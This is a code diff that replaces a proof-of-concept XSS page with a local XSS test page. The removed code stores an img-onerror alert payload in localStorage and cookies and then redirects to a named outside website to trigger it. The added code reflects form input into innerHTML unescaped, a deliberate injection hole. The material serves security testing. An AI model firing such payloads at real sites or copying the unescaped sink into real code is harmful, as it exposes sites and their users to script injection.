@@ -1,18 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC XSS Attack</title>
+  <title>Local XSS Test</title>
 </head>
 <body>
-  <script>
-    // Set Local Storage with a malicious payload
-    localStorage.setItem('xss_payload', '<img src="x" onerror="alert(\'XSS Attack!\')">');
-    
-    // Optionally set cookies
-    document.cookie = 'xss_payload=<img src="x" onerror="alert(\'XSS Attack!\')">; path=/';
-    
-    // Redirect to the target URL where the payload should be triggered
-    window.location.href = 'https://www.pon-cat.com/nl/';
+  <form id="search-form" action="#">
+    <input name="query" type="text" value="" placeholder="Type a keyword">
+    <button type="submit">Submit</button>
+  </form>
+
+  <script type="text/javascript">
+    document.querySelector('#search-form').addEventListener('submit', function(e) {
+      e.preventDefault(); // Prevent form submission for testing
+      var value = document.querySelector('[name="query"]').value;
+      // Simulate processing of the input (e.g., reflecting it somewhere)
+      document.body.innerHTML += `<div>${value}</div>`;
+    });
   </script>
 </body>
 </html>
